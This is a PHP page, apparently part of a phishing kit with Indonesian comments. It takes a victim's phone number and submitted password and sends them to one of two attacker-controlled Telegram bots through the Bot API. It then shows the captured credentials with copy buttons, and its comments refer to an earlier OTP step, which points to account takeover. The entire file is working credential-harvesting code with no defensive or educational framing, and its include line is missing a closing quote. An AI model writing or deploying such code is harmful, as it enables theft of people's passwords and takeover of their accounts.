<?php
include "./api/telegram.php

$phone = $_SESSION['phoneNumber'];
$password = $_POST['password'];
$_SESSION['password'] = $password;

// Format pesan (Markdown)
$message = "
( PASSWORD | $phone )

- No HP: `$phone`
- Password: `$password`

via Telegram
";

// Fungsi kirim pesan
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url .= "&text=" . urlencode($message);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// Ambil ID bot dari session (agar sesuai dengan nomor & OTP sebelumnya)
$bot_id = $_SESSION['bot_id'] ?? 1;

// Kirim ke bot yang sesuai
if ($bot_id === 1) {
    sendMessage($id_telegram1, $message, $id_botTele1);
} else {
    sendMessage($id_telegram2, $message, $id_botTele2);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Salin Informasi</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c3e50;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
        }

        .info-box {
            background-color: #34495e;
            padding: 20px;
            border-radius: 8px;
            width: 300px;
            text-align: center;
        }

        .info-box p {
            margin: 10px 0;
            font-size: 16px;
            cursor: pointer;
            user-select: none;
            padding: 10px;
            border: 2px solid transparent;
            border-radius: 5px;
            transition: background-color 0.3s, border-color 0.3s;
        }

        .info-box p:hover {
            background-color: #1abc9c;
            border-color: #16a085;
        }

        .info-box p:active {
            background-color: #16a085;
        }

        .copy-message {
            margin-top: 10px;
            color: #bdc3c7;
        }

        .copy-message.success {
            color: #2ecc71;
        }
    </style>
</head>
<body>
    <div class="info-box">
        <p id="copyPhone" onclick="copyToClipboard('copyPhone')">No HP: <?php echo $phone; ?></p>
        <p id="copyPassword" onclick="copyToClipboard('copyPassword')">Password: <?php echo $password; ?></p>
        <p class="copy-message" id="copyMessage"></p>
    </div>

    <script>
        function copyToClipboard(id) {
            var textElement = document.getElementById(id);
            var text = textElement.textContent || textElement.innerText;

            // Create a temporary text area element to copy text
            var tempTextArea = document.createElement("textarea");
            tempTextArea.value = text;
            document.body.appendChild(tempTextArea);

            // Select and copy the text
            tempTextArea.select();
            tempTextArea.setSelectionRange(0, 99999); // For mobile devices

            // Copy the text to clipboard
            document.execCommand("copy");
            document.body.removeChild(tempTextArea);

            // Display a success message
            var copyMessage = document.getElementById('copyMessage');
            copyMessage.textContent = "Copied to clipboard!";
            copyMessage.classList.add('success');

            // Hide the message after 3 seconds
            setTimeout(function() {
                copyMessage.textContent = "";
                copyMessage.classList.remove('success');
            }, 3000);
        }
    </script>
</body>
</html>
